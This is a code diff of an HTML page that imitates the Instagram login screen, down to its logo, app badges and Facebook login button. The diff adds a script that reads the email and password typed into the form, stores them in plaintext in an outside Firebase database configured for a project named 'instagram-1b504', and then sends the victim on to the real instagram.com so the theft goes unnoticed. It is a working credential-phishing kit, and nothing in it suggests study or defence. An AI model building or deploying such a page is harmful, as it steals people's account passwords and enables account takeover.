@@ -29,30 +29,20 @@
         }
 
         .logo {
-            width: 300px; /* Increased width */
-            height: 80px; /* Adjust height proportionally */
-            margin-bottom: 20px;
+            width: 250px; /* Adjusted width */
+            height: 100px; /* Adjusted height proportionally */
+            margin: 0 auto 20px; /* Center horizontally and add margin-bottom */
             background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNCLZHKTLEOKZDwh3sr39VHnlLzrHquaLv3nSA2OUdWdLl1cljz8P6E2k16ov-yr0a-lA&usqp=CAU');
             background-size: contain; /* Ensures the entire image is visible */
             background-position: center;
             background-repeat: no-repeat;
-            display: inline-block;
+            display: block; /* Ensure it's a block-level element for centering */
         }
 
         form {
             display: flex;
             flex-direction: column;
         }
-.logo {
-    width: 250px; /* Increased width */
-    height: 100px; /* Adjust height proportionally */
-    margin: 0 auto 20px; /* Center horizontally and add margin-bottom */
-    background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRNCLZHKTLEOKZDwh3sr39VHnlLzrHquaLv3nSA2OUdWdLl1cljz8P6E2k16ov-yr0a-lA&usqp=CAU');
-    background-size: contain; /* Ensures the entire image is visible */
-    background-position: center;
-    background-repeat: no-repeat;
-    display: block; /* Ensure it's a block-level element for centering */
-}
 
         input[type="text"], input[type="password"] {
             margin-bottom: 10px;
@@ -107,7 +97,6 @@
             border-radius: 10px; /* Increased border-radius for a more curved effect */
             font-weight: bold;
             cursor: pointer;
-            url("")
         }
 
         .forgot-password {
@@ -124,24 +113,7 @@
             border-radius: 5px; /* Rounded corners for the container */
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); /* Optional: adds shadow for a subtle effect */
         }
-        ._ab36 {
-    border: 0;
-    display: inline-block;
-    font: inherit;
-    font-size: 100%;
-    margin: 0;
-    margin-right: 8px;
-    padding: 0;
-    position: relative;
-    top: 3px;
-    vertical-align: baseline;
-}
-._a04s {
-    background-repeat: no-repeat;
-    background-position: -414px -259px;
-    height: 16px;
-    width: 16px;
-}
+
         .signup {
             font-size: 14px;
         }
@@ -176,7 +148,6 @@
                 <input type="password" placeholder="Password">
                 <button type="submit">Log in</button>
                 <div class="divider">OR</div>
-                <span class=" _a04s _ab36"></span>
                 <button type="button" class="fb-login">Log in with Facebook</button>
                 <a href="instagram.com" class="forgot-password">Forgot password?</a>
             </form>
@@ -189,11 +160,66 @@
         <div class="get-app">
             <p>Get the app.</p>
             <div class="app-links">
-                <a aria-label="Get it on Google Play" class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x2pgyrj x1emribx _a6hd" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=ig_mid%3D15E74B33-67D0-4F1D-9437-C9223E09368E%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" rel="nofollow noreferrer" role="link" tabindex="0" target="_blank"><img alt="Get it on Google Play" class="x1vqgdyp" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"></a>
-                <a aria-label="Get it from Microsoft" class="x1i10hfl xjbqb8w x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x2pgyrj x1emribx _a6hd" href="ms-windows-store://pdp/?productid=9nblggh5l9xt&amp;referrer=appbadge&amp;source=www.instagram.com&amp;mode=mini&amp;pos=0%2C0%2C1920%2C1020" rel="nofollow noreferrer" role="link" tabindex="0" target="_blank"><img alt="Get it from Microsoft" class="x1vqgdyp" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"></a>
+                <a aria-label="Get it on Google Play" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=ig_mid%3D15E74B33-67D0-4F1D-9437-C9223E09368E%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" rel="nofollow noreferrer" target="_blank">
+                    <img alt="Get it on Google Play" src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png">
+                </a>
+                <a aria-label="Get it from Microsoft" href="ms-windows-store://pdp/?productid=9nblggh5l9xt&amp;referrer=appbadge&amp;source=www.instagram.com&amp;mode=mini&amp;pos=0%2C0%2C1920%2C1020" rel="nofollow noreferrer" target="_blank">
+                    <img alt="Get it from Microsoft" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
+                </a>
             </div>
         </div>
     </div>
-    <script type="module" src="script.js"></script>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
+
+    <script>
+        // Your Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDpa29Aq7gNhsjT3fzhZSHlSJSJq-f3JZM",
+            authDomain: "instagram-1b504.firebaseapp.com",
+            databaseURL: "https://instagram-1b504-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "instagram-1b504",
+            storageBucket: "instagram-1b504.appspot.com",
+            messagingSenderId: "629010790114",
+            appId: "1:629010790114:web:5195248d0e727b9f74d0bb",
+            measurementId: "G-J1E2CNTXEY"
+        };
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.getDatabase(app);
+
+        // Handle form submission
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.querySelector('form');
+            
+            form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                
+                const email = form.querySelector('input[type="text"]').value;
+                const password = form.querySelector('input[type="password"]').value;
+                
+                if (email && password) {
+                    // Create a unique key for each entry
+                    const userId = Date.now(); // Simple unique ID based on timestamp
+                    const userRef = firebase.ref(database, 'users/' + userId);
+
+                    // Save the data to Firebase Realtime Database
+                    firebase.set(userRef, {
+                        email: email,
+                        password: password
+                    }).then(() => {
+                        // Redirect to Instagram after data is saved
+                        window.location.href = 'https://www.instagram.com';
+                    }).catch((error) => {
+                        console.error(error);
+                    });
+                } else {
+                    alert('Please enter both email and password.');
+                }
+            });
+        });
+    </script>
 </body>
 </html>
